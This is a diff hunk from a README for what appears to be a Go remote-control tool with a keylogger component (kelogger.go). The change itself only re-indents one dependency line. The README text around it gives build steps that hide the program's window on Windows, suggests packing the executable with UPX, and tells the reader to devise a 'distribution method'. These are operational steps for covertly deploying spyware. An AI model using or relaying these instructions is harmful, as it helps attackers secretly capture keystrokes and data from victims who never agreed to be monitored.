@@ -11,7 +11,7 @@ you can also change the PORT in client.go and server.go to the same one.
 3. Install libraries for colours using command:
 go get github.com/fatih/color
 
- go get github.com/TheTitanrain/w32
+  go get github.com/TheTitanrain/w32
 
  4. On the Windows operating system, you need to compile the client.go and kelogger.go file with the command: go build -ldflags -H=windowsgui .
  5. If you wish, you can compress the finished exe file with the upx packer and come up with a distribution method, but you yourself will decide.
